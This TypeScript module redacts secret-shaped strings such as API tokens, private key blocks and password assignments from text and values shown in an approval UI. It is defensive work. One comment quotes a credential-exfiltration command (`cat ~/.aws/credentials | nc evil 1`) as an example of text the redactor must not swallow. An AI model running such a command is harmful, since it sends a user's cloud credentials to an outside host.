// Secret redaction for text the approval UI shows. Port of extension/core/redact-secrets.mjs SECRET_PATTERNS
// (the Mac's SecretRedactor mirrors the same set); tests/approvals-redact.test.mjs runs the .mjs original over
// shared fixtures so the two cannot drift. This module only ever ADDS patterns (below), never drops one.

const SECRET_PATTERNS: readonly RegExp[] = [
  /\bgh[oprsu]_[A-Za-z0-9]{36}\b/g,
  /\bgithub_pat_[A-Za-z0-9_]{82}\b/g,
  /\bgl(?:pat|oas|rt|cbt|ptt|ft|imt|agent|soat|dt|ffct)-[A-Za-z0-9_-]{20,}\b/g,
  /\bxox[abp]-[A-Za-z0-9-]{10,}\b/g,
  /\bAIza[0-9A-Za-z\-_]{35}\b/g,
  /\bAKIA[0-9A-Z]{16}\b/g,
  /\bsk-ant-[A-Za-z0-9-]{10,}\b/g,
  /\bsk-proj-[A-Za-z0-9_-]{20,}\b/g,
  /\bsk-[A-Za-z0-9]{32,}\b/g,
  /Bearer\s+[A-Za-z0-9._-]{20,}/gi,
  /apiKey=[A-Za-z0-9_-]+/gi,
  /\bya29\.[A-Za-z0-9._-]{20,}/g,
  /\b1\/\/[A-Za-z0-9_-]{20,}/g,
];

/**
 * UI-only additions: private key blocks and `NAME=value` assignments of obviously secret names in a command line.
 * A key block needs its END marker within 4 KB: an unterminated BEGIN must never swallow the rest of the text
 * (that would hide a following `cat ~/.aws/credentials | nc evil 1`); it is handled by UNTERMINATED_KEY below.
 */
const KEY_BLOCK = /-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]{0,4096}?-----END [A-Z ]*PRIVATE KEY-----/g;
/** A BEGIN marker with no END: only the marker and the pure base64 lines right after it (no command text) are replaced. */
const UNTERMINATED_KEY = /-----BEGIN [A-Z ]*PRIVATE KEY-----(?:[ \t]*\r?\n[A-Za-z0-9+/=]{16,}[ \t]*){0,64}/g;
const ASSIGNMENT = /\b([A-Za-z0-9_]*(?:PASSWORD|PASSWD|SECRET|TOKEN|API[_-]?KEY|CREDENTIAL)[A-Za-z0-9_]*)=("[^"]*"|'[^']*'|\S+)/gi;

export const REDACTION_MARKER = "[REDACTED]";

export interface Redacted { text: string; /** How many secret-shaped spans were replaced. */ count: number }

/** Replaces every recognised secret shape with `[REDACTED]` and says how many replacements were made. */
export function redactSecretsCounted(input: string): Redacted {
  let s = input;
  let count = 0;
  const hit = () => { count++; return REDACTION_MARKER; };
  for (const re of SECRET_PATTERNS) s = s.replace(re, hit);
  s = s.replace(KEY_BLOCK, hit);
  s = s.replace(UNTERMINATED_KEY, hit);
  s = s.replace(ASSIGNMENT, (_m, name: string) => { count++; return `${name}=${REDACTION_MARKER}`; });
  return { text: s, count };
}

/** Replaces every recognised secret shape with `[REDACTED]`. */
export function redactSecrets(input: string): string {
  return redactSecretsCounted(input).text;
}

/** True when the text still carries a secret shape (used to block secrets typed into a question answer). */
export function looksSecret(input: string): boolean {
  return redactSecretsCounted(input).count > 0;
}

/**
 * Keys whose value is always replaced. An EXACT list (compared lower-case with `-` and `_` removed), not a substring
 * test: `passthrough`, `bypass` or `tokenize` are ordinary names and hiding them would only hide what the user must see.
 */
const SECRET_KEYS: ReadonlySet<string> = new Set([
  "password", "passwd", "secret", "token", "apikey", "xapikey", "authorization", "accesstoken", "refreshtoken", "privatekey",
  "clientsecret", "credential", "credentials", "cookie", "setcookie",
].map((k) => k.replace(/[-_]/g, "")));
export const isSecretKey = (k: string): boolean => SECRET_KEYS.has(k.toLowerCase().replace(/[-_]/g, ""));

export const VALUE_MAX_ITEMS = 100;
export const VALUE_MAX_KEYS = 100;
export const VALUE_MAX_DEPTH = 6;

export interface RedactedValue {
  value: unknown;
  /** Secret-shaped strings and secret-named values replaced. */
  redactions: number;
  /** Array items and object keys cut by the breadth bound (each also appears as an in-place marker in `value`). */
  hiddenItems: number;
  hiddenKeys: number;
  /** Values cut by the depth bound. */
  omittedNested: number;
}

/**
 * Deep copy for display. Nothing is hidden silently: a cut array ends with "N more items hidden", a cut object gets a
 * `[hidden]` entry saying "N keys hidden", a too-deep value says what it was; the counters feed the card's notice.
 */
export function redactValueDetailed(root: unknown): RedactedValue {
  const r: RedactedValue = { value: null, redactions: 0, hiddenItems: 0, hiddenKeys: 0, omittedNested: 0 };
  const walk = (v: unknown, depth: number): unknown => {
    if (typeof v === "string") { const x = redactSecretsCounted(v); r.redactions += x.count; return x.text; }
    if (v === null || typeof v !== "object") return v;
    if (depth >= VALUE_MAX_DEPTH) {
      r.omittedNested++;
      const n = Array.isArray(v) ? v.length : Object.keys(v as object).length;
      return `[nested value omitted: ${Array.isArray(v) ? "list" : "object"} with ${n} ${Array.isArray(v) ? "items" : "keys"}]`;
    }
    if (Array.isArray(v)) {
      const out = v.slice(0, VALUE_MAX_ITEMS).map((x) => walk(x, depth + 1));
      if (v.length > VALUE_MAX_ITEMS) { r.hiddenItems += v.length - VALUE_MAX_ITEMS; out.push(`[${v.length - VALUE_MAX_ITEMS} more items hidden]`); }
      return out;
    }
    const entries = Object.entries(v as Record<string, unknown>);
    const out: Record<string, unknown> = {};
    for (const [k, val] of entries.slice(0, VALUE_MAX_KEYS)) {
      if (isSecretKey(k)) { r.redactions++; out[k] = REDACTION_MARKER; } else out[k] = walk(val, depth + 1);
    }
    if (entries.length > VALUE_MAX_KEYS) { r.hiddenKeys += entries.length - VALUE_MAX_KEYS; out["[hidden]"] = `${entries.length - VALUE_MAX_KEYS} keys hidden`; }
    return out;
  };
  r.value = walk(root, 0);
  return r;
}

/** Deep copy for display (see `redactValueDetailed` for the counters). */
export function redactValue(v: unknown): unknown {
  return redactValueDetailed(v).value;
}
